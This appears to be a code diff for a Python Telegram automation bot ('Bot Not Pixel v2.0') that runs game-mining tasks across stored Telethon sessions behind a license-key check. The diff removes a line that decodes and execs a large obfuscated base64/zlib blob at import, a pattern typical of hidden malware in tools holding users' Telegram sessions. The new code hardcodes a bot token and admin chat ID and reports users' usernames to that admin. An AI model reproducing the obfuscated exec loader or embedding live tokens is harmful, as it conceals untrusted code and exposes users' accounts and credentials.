@@ -1,1 +1,248 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+import os
+import threading
+import asyncio
+import hashlib
+import time
+import uuid
+import requests
+import json
+from bot.painter import painters
+from bot.mineclaimer import mine_claimer
+from bot.utils import night_sleep, Colors
+from bot.notpx import NotPx
+from telethon.sync import TelegramClient
+import telebot
+from datetime import datetime, timedelta
+
+BOT_TOKEN = "7722039584:AAG2BweKTZQJ60esvAMkRtcZ7_eTnzywj9E"
+ADMIN_CHAT_ID = "5373988314"
+
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# File to store active keys and their information
+KEYS_FILE = "active_keys.json"
+
+# Load existing keys from file
+def load_keys():
+    if os.path.exists(KEYS_FILE):
+        with open(KEYS_FILE, 'r') as f:
+            return json.load(f)
+    return {}
+
+# Save keys to file
+def save_keys(keys):
+    with open(KEYS_FILE, 'w') as f:
+        json.dump(keys, f)
+
+# Dictionary to store active keys and their information
+active_keys = load_keys()
+
+def generate_license_key():
+    key = uuid.uuid4().hex
+    expiration_date = (datetime.now() + timedelta(days=5)).isoformat()
+    active_keys[key] = {"expiration": expiration_date, "user": None}
+    save_keys(active_keys)
+    return key
+
+def check_license(key, username):
+    if key in active_keys:
+        expiration = datetime.fromisoformat(active_keys[key]["expiration"])
+        if datetime.now() < expiration:
+            if active_keys[key]["user"] is None:
+                active_keys[key]["user"] = username
+                save_keys(active_keys)
+                bot.send_message(ADMIN_CHAT_ID, f"New user: {username} has activated key: {key}")
+                return True
+            elif active_keys[key]["user"] == username:
+                return True
+            else:
+                return "License key is already in use by another user"
+        else:
+            del active_keys[key]
+            save_keys(active_keys)
+            return False
+    return False
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Selamat datang di layanan kami yang istimewa! 🌟\n\nBerikut adalah perintah yang tersedia:\n\n/generate_key - Menghasilkan kunci lisensi baru (hanya untuk admin)\n/check_key [kunci] - Memeriksa validitas kunci lisensi Anda\n/active_users - Menampilkan daftar pengguna aktif (hanya untuk admin)\n\nSilakan gunakan perintah yang sesuai untuk memulai pengalaman Anda bersama kami!")
+
+@bot.message_handler(commands=['generate_key'])
+def generate_key(message):
+    if str(message.chat.id) != ADMIN_CHAT_ID:
+        bot.reply_to(message, "Anda tidak memiliki izin untuk menghasilkan kunci.")
+        return
+    
+    key = generate_license_key()
+    bot.reply_to(message, f"Kunci yang dihasilkan: {key}\nBerlaku selama 5 hari.")
+
+@bot.message_handler(commands=['check_key'])
+def check_key(message):
+    key = message.text.split()[1] if len(message.text.split()) > 1 else None
+    if key:
+        result = check_license(key, message.from_user.username)
+        if result == True:
+            bot.reply_to(message, "Kunci Anda valid dan aktif.")
+        elif result == "License key is already in use by another user":
+            bot.reply_to(message, "Kunci lisensi sudah digunakan oleh pengguna lain.")
+        else:
+            bot.reply_to(message, "Kunci tidak valid atau sudah kadaluarsa.")
+    else:
+        bot.reply_to(message, "Silakan berikan kunci untuk diperiksa.")
+
+@bot.message_handler(commands=['active_users'])
+def active_users(message):
+    if str(message.chat.id) != ADMIN_CHAT_ID:
+        bot.reply_to(message, "Anda tidak memiliki izin untuk melihat pengguna aktif.")
+        return
+    
+    user_count = sum(1 for info in active_keys.values() if info["user"] is not None)
+    user_list = "\n".join([f"Kunci: {key}, Pengguna: {info['user']}" for key, info in active_keys.items() if info["user"] is not None])
+    bot.reply_to(message, f"Total pengguna aktif: {user_count}\n\n{user_list}")
+
+def multithread_starter(key, username):
+    result = check_license(key, username)
+    if result == True:
+        print("License key verified. Starting the script...")
+        if not os.path.exists("sessions"):
+            os.mkdir("sessions")
+        dirs = os.listdir("sessions/")
+        sessions = list(filter(lambda x: x.endswith(".session"), dirs))
+        sessions = list(map(lambda x: x.split(".session")[0], sessions))
+        
+        for session_name in sessions:
+            try:
+                cli = NotPx("sessions/" + session_name)
+
+                def run_painters():
+                    asyncio.run(painters(cli, session_name))
+
+                def run_mine_claimer():
+                    asyncio.run(mine_claimer(cli, session_name))
+
+                threading.Thread(target=run_painters).start()
+                threading.Thread(target=run_mine_claimer).start()
+            except Exception as e:
+                print("[!] {}Error on load session{} \"{}\", error: {}".format(Colors.RED, Colors.END, session_name, e))
+    elif result == "License key is already in use by another user":
+        print("[!] " + result)
+    else:
+        print("[!] Invalid or expired license key. Please contact the admin for a valid key.")
+
+def add_api_credentials():
+    api_id = input("Enter API ID: ")
+    api_hash = input("Enter API Hash: ")
+    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'env.txt')
+    with open(env_path, "w") as f:
+        f.write(f"API_ID={api_id}\n")
+        f.write(f"API_HASH={api_hash}\n")
+    print("[+] API credentials saved successfully in env.txt file.")
+
+def reset_api_credentials():
+    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'env.txt')
+    if os.path.exists(env_path):
+        os.remove(env_path)
+        print("[+] API credentials reset successfully.")
+    else:
+        print("[!] No env.txt file found. Nothing to reset.")
+
+def reset_session():
+    if not os.path.exists("sessions"):
+        os.mkdir("sessions")
+    sessions = [f for f in os.listdir("sessions/") if f.endswith(".session")]
+    if not sessions:
+        print("[!] No sessions found.")
+        return
+    print("Available sessions:")
+    for i, session in enumerate(sessions, 1):
+        print(f"{i}. {session[:-8]}")
+    choice = input("Enter the number of the session to reset: ")
+    try:
+        session_to_reset = sessions[int(choice) - 1]
+        os.remove(os.path.join("sessions", session_to_reset))
+        print(f"[+] Session {session_to_reset[:-8]} reset successfully.")
+    except (ValueError, IndexError):
+        print("[!] Invalid choice. Please try again.")
+
+def load_api_credentials():
+    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'env.txt')
+    if os.path.exists(env_path):
+        with open(env_path, 'r') as f:
+            lines = f.readlines()
+            api_id = None
+            api_hash = None
+            for line in lines:
+                if line.startswith('API_ID='):
+                    api_id = line.split('=')[1].strip()
+                elif line.startswith('API_HASH='):
+                    api_hash = line.split('=')[1].strip()
+            return api_id, api_hash
+    return None, None
+
+def process():
+    print(f"""{Colors.CYAN}
+╔═══════════════════════════════╗
+║        Bot Not Pixel v2.0     ║
+║   Dibuat oleh: itbaarts_dev   ║
+╚═══════════════════════════════╝{Colors.END}""")
+    print("Starting Telegram bot...")
+    bot_thread = threading.Thread(target=bot.polling, kwargs={"none_stop": True})
+    bot_thread.start()
+    
+    while True:
+        key = input("Enter your license key to use the script: ")
+        username = input("Enter your username: ")
+        result = check_license(key, username)
+        if result == True:
+            print("License key verified. You can now use the script.")
+            break
+        elif result == "License key is already in use by another user":
+            print("[!] " + result)
+        else:
+            print("[!] Invalid or expired license key. Please contact the admin for a valid key.")
+    
+    while True:
+        print("\nMain Menu:")
+        print("1. Add Account Session")
+        print("2. Start Bot Mining")
+        print("3. Configure API Credentials")
+        print("4. Reset API Credentials")
+        print("5. Reset Session")
+        print("6. Exit Application")
+        
+        option = input("Please select an option: ")
+        
+        if option == "1":
+            name = input("\nEnter Session name: ")
+            if not os.path.exists("sessions"):
+                os.mkdir("sessions")
+            if not any(name in i for i in os.listdir("sessions/")):
+                api_id, api_hash = load_api_credentials()
+                if api_id and api_hash:
+                    client = TelegramClient("sessions/" + name, api_id, api_hash).start()
+                    client.disconnect()
+                    print("[+] Session {} {}saved success{}.".format(name, Colors.GREEN, Colors.END))
+                else:
+                    print("[!] API credentials not found. Please add them first.")
+            else:
+                print("[x] Session {} {}already exist{}.".format(name, Colors.RED, Colors.END))
+        elif option == "2":
+            multithread_starter(key, username)
+        elif option == "3":
+            add_api_credentials()
+        elif option == "4":
+            reset_api_credentials()
+        elif option == "5":
+            reset_session()
+        elif option == "6":
+            print("Exiting...")
+            bot.stop_polling()
+            bot_thread.join()
+            break
+        else:
+            print("[!] Invalid option. Please try again.")
+
+if __name__ == "__main__":
+    if not os.path.exists("sessions"):
+        os.mkdir("sessions")
+    process()
